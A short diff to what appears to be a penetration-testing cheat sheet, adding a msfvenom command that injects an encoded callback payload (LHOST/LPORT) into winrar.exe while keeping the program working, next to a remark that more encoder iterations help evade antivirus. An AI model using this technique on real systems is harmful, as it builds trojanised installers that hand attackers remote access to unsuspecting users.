@@ -547,6 +547,10 @@ msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -
 - Having more iterations increases the chances of evading AVs.
 
 #### Injecting Payloads into Window PEs
+```
+msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f exe -x winrar.exe > winrar.exe
+```
+- `-k` will preserve functionality of `winrar.exe`.
 
 ## Linux Compilation
 ```
